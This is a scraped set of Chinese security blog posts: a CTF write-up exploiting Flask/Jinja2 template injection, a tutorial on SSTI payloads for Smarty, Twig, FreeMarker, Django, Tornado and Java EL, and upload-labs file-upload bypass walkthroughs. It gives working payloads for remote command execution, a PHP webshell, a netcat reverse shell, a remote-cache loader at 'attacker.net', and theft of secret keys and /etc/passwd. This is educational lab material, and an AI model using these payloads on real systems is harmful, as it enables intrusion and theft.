'werkzeug.datastructures.Headers'&gt;, &lt;class 'werkzeug.datastructures.ImmutableHeadersMixin'&gt;, &lt;class 'werkzeug.datastructures.HeaderSet'&gt;, &lt;class 'werkzeug.datastructures.ETags'&gt;, &lt;class 'werkzeug.datastructures.IfRange'&gt;, &lt;class 'werkzeug.datastructures.Range'&gt;, &lt;class 'werkzeug.datastructures.ContentRange'&gt;, &lt;class 'werkzeug.datastructures.FileStorage'&gt;, &lt;class 'werkzeug.urls.Href'&gt;, &lt;class 'werkzeug.wsgi.SharedDataMiddleware'&gt;, &lt;class 'werkzeug.wsgi.DispatcherMiddleware'&gt;, &lt;class 'werkzeug.wsgi.ClosingIterator'&gt;, &lt;class 'werkzeug.wsgi.FileWrapper'&gt;, &lt;class 'werkzeug.wsgi.LimitedStream'&gt;, &lt;class 'werkzeug.formparser.FormDataParser'&gt;, &lt;class 'werkzeug.formparser.MultiPartParser'&gt;, &lt;class 'werkzeug.utils.HTMLBuilder'&gt;, &lt;class 'werkzeug.wrappers.BaseRequest'&gt;, &lt;class 'werkzeug.wrappers.BaseResponse'&gt;, &lt;class 'werkzeug.wrappers.AcceptMixin'&gt;, &lt;class 'werkzeug.wrappers.ETagRequestMixin'&gt;, &lt;class 'werkzeug.wrappers.UserAgentMixin'&gt;, &lt;class 'werkzeug.wrappers.AuthorizationMixin'&gt;, &lt;class 'werkzeug.wrappers.StreamOnlyMixin'&gt;, &lt;class 'werkzeug.wrappers.ETagResponseMixin'&gt;, &lt;class 'werkzeug.wrappers.ResponseStream'&gt;, &lt;class 'werkzeug.wrappers.ResponseStreamMixin'&gt;, &lt;class 'werkzeug.wrappers.CommonRequestDescriptorsMixin'&gt;, &lt;class 'werkzeug.wrappers.CommonResponseDescriptorsMixin'&gt;, &lt;class 'werkzeug.wrappers.WWWAuthenticateMixin'&gt;, &lt;class 'werkzeug.exceptions.Aborter'&gt;, &lt;class 'threading._Verbose'&gt;, &lt;type 'cPickle.Unpickler'&gt;, &lt;type 'cPickle.Pickler'&gt;, &lt;class 'jinja2.utils.MissingType'&gt;, &lt;class 'jinja2.utils.LRUCache'&gt;, &lt;class 'jinja2.utils.Cycler'&gt;, &lt;class 'jinja2.utils.Joiner'&gt;, &lt;class 'markupsafe._MarkupEscapeHelper'&gt;, &lt;class 'jinja2.nodes.EvalContext'&gt;, &lt;class 'jinja2.runtime.TemplateReference'&gt;, &lt;class 'jinja2.nodes.Node'&gt;, &lt;class 'jinja2.runtime.Context'&gt;, &lt;class 'jinja2.runtime.BlockReference'&gt;, &lt;class 'jinja2.runtime.LoopContext'&gt;, &lt;class 'jinja2.runtime.LoopContextIterator'&gt;, &lt;class 'jinja2.runtime.Macro'&gt;, &lt;class 'jinja2.runtime.Undefined'&gt;, &lt;class 'numbers.Number'&gt;, &lt;class 'decimal.Decimal'&gt;, &lt;class 'decimal._ContextManager'&gt;, &lt;class 'decimal.Context'&gt;, &lt;class 'decimal._WorkRep'&gt;, &lt;class 'decimal._Log10Memoize'&gt;, &lt;type '_ast.AST'&gt;, &lt;class 'jinja2.lexer.Failure'&gt;, &lt;class 'jinja2.lexer.TokenStreamIterator'&gt;, &lt;class 'jinja2.lexer.TokenStream'&gt;, &lt;class 'jinja2.lexer.Lexer'&gt;, &lt;class 'jinja2.parser.Parser'&gt;, &lt;class 'jinja2.visitor.NodeVisitor'&gt;, &lt;class 'jinja2.compiler.Identifiers'&gt;, &lt;class 'jinja2.compiler.Frame'&gt;, &lt;class 'jinja2.environment.Environment'&gt;, &lt;class 'jinja2.environment.Template'&gt;, &lt;class 'jinja2.environment.TemplateModule'&gt;, &lt;class 'jinja2.environment.TemplateExpression'&gt;, &lt;class 'jinja2.environment.TemplateStream'&gt;, &lt;class 'jinja2.loaders.BaseLoader'&gt;, &lt;class 'jinja2.bccache.Bucket'&gt;, &lt;class 'jinja2.bccache.BytecodeCache'&gt;, &lt;class 'difflib.HtmlDiff'&gt;, &lt;class 'uuid.UUID'&gt;, &lt;type 'CArgObject'&gt;, &lt;type '_ctypes.CThunkObject'&gt;, &lt;type '_ctypes._CData'&gt;, &lt;type '_ctypes.CField'&gt;, &lt;type '_ctypes.DictRemover'&gt;, &lt;class 'ctypes.CDLL'&gt;, &lt;class 'ctypes.LibraryLoader'&gt;, &lt;class 'werkzeug.routing.RuleFactory'&gt;, &lt;class 'werkzeug.routing.RuleTemplate'&gt;, &lt;class 'werkzeug.routing.BaseConverter'&gt;, &lt;class 'werkzeug.routing.Map'&gt;, &lt;class 'werkzeug.routing.MapAdapter'&gt;, &lt;class 'flask.signals.Namespace'&gt;, &lt;class 'flask.signals._FakeSignal'&gt;, &lt;class 'werkzeug.local.Local'&gt;, &lt;class 'werkzeug.local.LocalStack'&gt;, &lt;class 'werkzeug.local.LocalManager'&gt;, &lt;class 'werkzeug.local.LocalProxy'&gt;, &lt;class 'flask.helpers.locked_cached_property'&gt;, &lt;class 'flask.helpers._PackageBoundObject'&gt;, &lt;type '_json.Scanner'&gt;, &lt;type '_json.Encoder'&gt;, &lt;class 'json.decoder.JSONDecoder'&gt;, &lt;class 'json.encoder.JSONEncoder'&gt;, &lt;class 'itsdangerous._CompactJSON'&gt;, &lt;class 'itsdangerous.SigningAlgorithm'&gt;, &lt;class 'itsdangerous.Signer'&gt;, &lt;class 'itsdangerous.Serializer'&gt;, &lt;class 'itsdangerous.URLSafeSerializerMixin'&gt;, &lt;class 'contextlib.GeneratorContextManager'&gt;, &lt;class 'contextlib.closing'&gt;, &lt;class 'click._compat._FixupStream'&gt;, &lt;class 'click._compat._AtomicFile'&gt;, &lt;class 'click.utils.LazyFile'&gt;, &lt;class 'click.utils.KeepOpenFile'&gt;, &lt;class 'click.types.ParamType'&gt;, &lt;class 'click.parser.Option'&gt;, &lt;class 'click.parser.Argument'&gt;, &lt;class 'click.parser.ParsingState'&gt;, &lt;class 'click.parser.OptionParser'&gt;, &lt;class 'click.formatting.HelpFormatter'&gt;, &lt;class 'click.core.Context'&gt;, &lt;class 'click.core.BaseCommand'&gt;, &lt;class 'click.core.Parameter'&gt;, &lt;class 'flask.cli.DispatchingApp'&gt;, &lt;class 'flask.cli.ScriptInfo'&gt;, &lt;class 'flask.config.ConfigAttribute'&gt;, &lt;class 'flask.ctx._AppCtxGlobals'&gt;, &lt;class 'flask.ctx.AppContext'&gt;, &lt;class 'flask.ctx.RequestContext'&gt;, &lt;class 'flask.sessions.SessionMixin'&gt;, &lt;class 'flask.sessions.TaggedJSONSerializer'&gt;, &lt;class 'flask.sessions.SessionInterface'&gt;, &lt;class 'flask.blueprints.BlueprintSetupState'&gt;, &lt;type 'select.epoll'&gt;, &lt;class 'werkzeug.serving.WSGIRequestHandler'&gt;, &lt;class 'werkzeug.serving._SSLContext'&gt;, &lt;class 'werkzeug.serving.BaseWSGIServer'&gt;, &lt;class 'logging.LogRecord'&gt;, &lt;class 'logging.Formatter'&gt;, &lt;class 'logging.BufferingFormatter'&gt;, &lt;class 'logging.Filter'&gt;, &lt;class 'logging.Filterer'&gt;, &lt;class 'logging.PlaceHolder'&gt;, &lt;class 'logging.Manager'&gt;, &lt;class 'logging.LoggerAdapter'&gt;, &lt;class 'jinja2.debug.TracebackFrameProxy'&gt;, &lt;class 'jinja2.ext.Extension'&gt;, &lt;class 'jinja2.ext._CommentFinder'&gt;, &lt;class 'jinja2.debug.ProcessedTraceback'&gt;] 找了很久都没找到可以自动写编号以及查找结果的脚本，可能是我搜索姿势不对，于是自己写了一个臭烂代码： 123456789101112import requestss=requests.session()url=&quot;http://4282889f587b4157a422f0850b772d399e6c949b99b34289.changame.ichunqiu.com/?name=&quot;choice=[]for i in range(0,301): payload=f&quot;{{{{''.__class__.__mro__[2].__subclasses__()[{i}]}}}}&quot; reponse=(s.get(url+payload).text) print(i,reponse) if &quot;file&quot; in reponse: pass_reponse = [i, reponse] choice.append(pass_reponse)print(choice) 最后只看到一个40 &lt;type&gt; flie 于是构建payload: 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()[40]}} file对象方法参考：https://www.runoob.com/python/file-methods.html 我们现在可以使用要么就是读要么就是写，除此之外没有其他办法，找了好久，还是看wp吧。。。。 1{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }} 解析一下上面这个payload，使用的是write的命令，并且是w，意思是将后面的内容写入/tmp/owned.cfg这个当中，没有则创建新文件。写入的内容是： 123from subprocess import check_outputRUNCMD=check_output#执行外部命令并获取他的输出 接下来输入: 1?name={{ config.from_pyfile('/tmp/owned.cfg') }} Flask 被设计为需要配置来启动应用。放置配置的地方即为这个config，如果是要添加文件中的内容则为以上格式 1{{ config['RUNCMD']('/usr/bin/id',shell=True) }} 此时就可以执行指令了 ‘ ‘内为放置指令的地方，shell=true的意思是让shell本身的管道对于受信任的输入仍然支持此时该命令可改写为： 1RUNCMD = os.system(&quot;/usr/bin/id&quot;)#相当于是间接调用了os模块执行系统命令 参考:https://docs.python.org/zh-cn/3/library/subprocess.html#replacing-bin-sh-shell-command-substitution接下来就是寻找flag并执行即可： 1?name={{ config['RUNCMD']('`echo ` l'+'s /var/www/html/',shell=True) }} 这里有两个点，第一个是由于ls被过滤，所以可以采用这中**’’+’’的拼接方式进行绕过，然后``两个反引号的作用是引用系统命令**我看其他payload 也可以采取使用base64编码再解码的形式进行绕过： 1{{ config['RUNCMD']('`echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d`',shell=True) }} 找到flag的位置，cat一下 1{{ config['RUNCMD']('`echo`cat /var/www/html/fl'+'4g',shell=True) }} 这里再提供一种拿到flag的方法，其实在前面也已经提过了：file类中有read方法：所以这里其实也可以写成： 1{{&quot;&quot;.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/fl'+'4g').read()}} 1Hello flag{f0551e10-7ebe-45a0-be51-0d103fc0400b}","link":"/2021/02/25/i%E6%98%A5%E7%A7%8B9/"},{"title":"ssti注入续()","text":"前言：之前理解的ssti注入一直以为是python才有的，后来发现并不是的，应该说是服务器端模板注入，凡是使用模板的地方都有可能出现ssti注入！！ 模板注入攻击步骤确定模板类型——&gt;选择对应攻击语句 常见模板引擎1.php 常用的Smarty Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛 Twig Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。 Blade Blade 是 Laravel 提供的一个既简单又强大的模板引擎。 和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。 2.Java 常用的JSP 这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典 FreeMarker FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。 Velocity Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。 3.Python 常用的Jinja2 flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎 django django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了 tornado tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发 4.注意：同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如 tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号 1{{}} 中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些 php实例:1234567&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[‘name‘]}&quot;); // 将用户输入作为模版内容的一部分echo $output; python实例1234567891011@app.errorhandler(404)def page_not_found(e): template = '''{%% extends &quot;layout.html&quot; %%}{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt;{%% endblock %%}''' % (request.url) return render_template_string(template), 404 java实例12&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } 检测方法这里提供一个大牛写的 SSTI 的检测工具 https://github.com/epinna/tplmap或者64验证是否会被运算输出 攻击方向0X06 攻击思路1.攻击方向：找到模板注入主要从三个方向进行攻击 (1)模板本身(2)框架本身(3)语言本身(4)应用本身 2.攻击方法：我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个 注意： 在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制 1.利用模板本身的特性进行攻击1.SmartySmarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function) 但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法 比如：getStreamVariable() github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件） payload: 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} 再比如：class Smarty_Internal_Write_File 有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法 函数原型： 1public function writeFile($_filepath, $_contents, Smarty $smarty) 但是这个第三个参数是一个 Smarty 类型，后来找到了 self::clearConfig() 函数原型： 1234public function clearConfig($varname = null){ return Smarty_Internal_Extension_Config::clearConfig($this, $varname);} 能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell payload： 1{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET['cmd']); ?&gt;&quot;,self::clearConfig())} 2.Twig相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 self:: 调用静态变量了，但是 通过官方文档的查询 如下图所示： 此处输入图片的描述 Twig 给我们提供了一个 _self, 虽然 _self 本身没有什么有用的方法，但是却有一个 env 如下图所示： 此处输入图片的描述 env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php 如下图所示： 此处输入图片的描述 因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞： payload: 12{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}} 但是新的问题出现了，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 getFilter() 这个函数中调用了一个 call_user_function 方法 123456789101112131415public function getFilter($name){ [snip] foreach ($this-&gt;filterCallbacks as $callback) { if (false !== $filter = call_user_func($callback, $name)) {//注意这行 return $filter; } } return false;}public function registerUndefinedFilterCallback($callable){ $this-&gt;filterCallbacks[] = $callable;} 我们只要把exec() 作为回调函数传进去就能实现命令执行了 payload: 123{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} 3.freeMarker这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源 payload: 1&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } 2.利用框架本身的特性进行攻击因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节 1.Django123def view(request, *args, **kwargs): template = 'Hello {user}, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) 注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，我么怎么办？ 可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？ p牛在自己的博客中分享了这个思路，我把它引用过来： Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项 什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标 后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件： 如下图： 此处输入图片的描述 所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。 payload: 123http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} 2.Flask/Jinja2config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。 如图所示： 此处输入图片的描述 这里我们利用 from_pyfile 和 from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了） 源码： 123456789101112131415161718192021222324def from_pyfile(self, filename, silent=False): filename = os.path.join(self.root_path, filename) d = types.ModuleType('config') d.__file__ = filename try: with open(filename) as config_file: exec(compile(config_file.read(), filename, 'exec'), d.__dict__) except IOError as e: if silent and e.errno in (errno.ENOENT, errno.EISDIR): return False e.strerror = 'Unable to load configuration file (%s)' % e.strerror raise self.from_object(d) return Truedef from_object(self, obj): if isinstance(obj, string_types): obj = import_string(obj) for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) 简单的解释一下这个方法： 这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 d.__dict__翻阅文档发现，这个参数的含义是指定 exec 执行的上下文， 如图所示： [![此处输入图片的描述](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python exec.png)](https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python exec.png)此处输入图片的描述 我们简单的模拟一下看一下效果 如图所示: 此处输入图片的描述此处输入图片的描述 执行的代码片段被放入了 d.__dict__ 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码 123for key in dir(obj): if key.isupper(): self[key] = getattr(obj, key) 这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件 12from os import systemSHELL = system 到时候我们就能通过 config[‘SHELL’] 调用 system 方法了 那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文[python 沙盒逃逸备忘](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/) 最终的 payload: 123456{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}//写文件{{ config.from_pyfile('/tmp/evil') }}//加载system{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}//执行命令反弹SHELL 3.Tornado写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明 根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西 1&quot;%'()*-/=[\\]_| 甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。 我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret 如下图： 此处输入图片的描述 你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看官方文档，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest ) 如下图所示： 此处输入图片的描述 这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看官方文档 如下图所示： 此处输入图片的描述 很清楚，我么看到 RequestHandler.settings 是 self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。 payload: 1http://117.78.26.79:31093/error?msg={{handler.settings}} 2.利用模语言本身的特性进行攻击1.PythonPython 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的[一篇博文](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/)中 2.JAVAjava.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类 如下图所示： 此处输入图片的描述 有了这个基础我们就能想到这样的payload payload： 123${T(java.lang.System).getenv()}${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')} 当然要是文件操作就要用另外的类了,思路是不变的 payload： 1${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} 注意: 这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL) 参考:https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF","link":"/2021/04/01/ssti%E6%B3%A8%E5%85%A5%E7%BB%AD/"},{"title":"upload-labs1","text":"文件上传漏洞原理成因1.服务器配置不当会导致任意文件上传2.web应用开放了文件上传的功能，并对上传的文件没有进行足够的限制和过滤3.web应用开放了文件上传功能，虽然在开发时加入了一定的过滤功能，但并不严格，可以被绕过4.上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。https://blog.csdn.net/qq_36119192/article/details/84593150上面这个是关于那几个后缀的文件的说明 产生条件1.web服务器要开启文件上传功能，并且上传API（接口）对外开放，即web用户可以访问；2.web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，web目录都具有执行权限；3.我们上传的文件在服务器的系统环境里能够正常运行，即web容器能够解析我们上传的脚本，不论脚本以什么样的形式存在。 危害恶意的脚本文件，又被称为webshell，webshell脚本称为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等导图 https://xz.aliyun.com/t/2435?spm=5176.12901015.0.i12901015.74b5525csqU5p2 upload-labs1步骤其实很简单，之前在学一句话木马的时候已经有学习过了流程是：在txt文本中写下一句话代码——&gt;将后缀改为jpg等图片格式的后缀——&gt;然后上传，在上传的时候抓包，在burp里面将后缀修改为php，使其在后面能够被运行——&gt;然后利用蚁剑等工具连接一句话木马即可。 将后缀改为php 并发送 然后在蚁剑中连接 好了 成功了以上为方法一，我们可以在burp中修改后缀，从而达到注入的效果这里就简述一下吧，因为之前打过一遍了忘记保存印象还挺深刻的：方法二：我们在index.php看到一个chekfile的过滤函数，然后再show_code里面看到一个JavaScript写的网页代码，我们可以知道，PHP中的代码在JavaScript中发挥作用，而在审查元素中我们可以看到JavaScript的函数调用当我们把他删除掉后，也就不存在过滤这一说，直接上传即可了方法三，直接禁用JavaScript函数调用思考：PHP，JavaScript的联动操作 upload-labs2第二关提示中说对MIME进行检查什么是MIME？使用MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，使用MIME类型可以设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。 在JSP页面中，contentType属性设置为：contentType=“text/html;charset=GBK”。 所以这里有两种方法：1.**：我们还是上传jpg然后抓包更改后缀为php，因为这个时候MIME-Type已经变为image/jpeg避开过滤了**2.**我们也可直接修改MIME-Type中的类型，将其修改为image/jpeg依旧是可以成功的接着看一下源代码**move_uploaded_file()函数将上传的文件移动到新的位置语法：move_uploaded_file(file,newloc) file 必需。规定要移动的文件。 newloc 必需。规定文件的新位置。 newloc 必需。规定文件的新位置。 move_uploaded_file()函数漏洞 upload-labs3黑名单基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。从这里开始 我们就进入了黑名单的关卡：看看代码吧因为已经写过一遍我就大概说一下：他是定义一组后缀名，然后对于传输过去的文件，经过删除文件名末尾的点，从文件的点开始向后截取，以及将文件名全部转化成小写，最后移除旁边的空格。其中strrchr()函数的作用就是搜素并窃取搜索点及以后的位置他禁用了挺多的类型的后缀的但是，我们还可以使用其他后缀进行绕过phtml,php3,php4,php5,pht upload-labs 4在这一关中 将很多php的拓展形式都过滤了这个时候我们需要引进一个.htaccess文件作用：htaccess文件时Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能，其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。https://blog.csdn.net/cmzhuang/article/details/53537591（深层理解博客） 上传.htaccess文件文件内容如下：SetHandler application/x-httpd-phpPS：这里需要将上传的文件不用前缀 即.htaccess指定文件进行php的转化：在写入.htaccess的时候，我们可以 &lt;FilesMatch &quot;shuaige&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 写出这段代码，注意到开头”shuaige”意为含有文件内含有shuaige的文件都会被解析为php文件这里要使用这个.htaccess要记得去apache里面配置一下 upload-labs5在这关当中，我们注意到，他过滤空格和.只过滤了一次，所以我们可以通过构建123.php. .的形式进行绕过过滤 upload-labs6在第六关中，发现他是没有对大小写进行过滤的所以我们 在后缀做点手脚即可 然后抓包改回即可 upload-labs7在第七关中没有去空，所以可以在后缀加个空格，然后抓包改回 upload-labs8这关是在文件后加个. 在windows系统中，会自动把.给删除掉，所以可以先抓包加个.绕过过滤，然后文件上传到目录后，.会自动被删除 upload-labs9在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名然后我们点击上传图像后的文件，点击查看图像，删除后面的::$DATA即可此时有个问题，为什么文件上传后，文件名变成随机数字了呢？原因就在这一开始猜测是有其他保护机制，查看源码 果然如此但是修改后的文件名可以 使用burp 的go后 可以查找得到 upload-labs10这一题和第五题的解题方法是一样的，但是注意到它的源码有些地方不太一样了就是他的路径变成是直接加file.name，感觉还是上一个保护机制更强一些，虽然用处也不大哈哈哈 upload-labs11首先来分析一下源码其中有一个str_ireplace() 它的作用是这样的：将file_name中符合deny_ext格式的全部替换成空 而在上面 它是将两边的空格全部去掉，所以我们其实可以使用**双写**的方式进行绕过： 上传成功 并且可以成功显示 这就让人联想到sql绕过过滤了。 为什么要采取替换为空的方式？因为如果为空后缀 是不符合格式，直接就上传失败了 upload-labs12白名单基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。 前面 都是对于文件后缀名的过滤，首先是使用substr()和strrpos()截取后缀进行白名单匹配，这里没什么能操作的空间，再往下看，看到一个在img_path中 file_ext是可控的！这里就要介绍一下 截断上传前提条件：php 版本 &lt; 5.3.4且php的参数magic_quotes_gpc必须关闭 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片一下为例子： 此时 path=&quot;upload/web/&quot;file=&quot;1.jpg&quot; 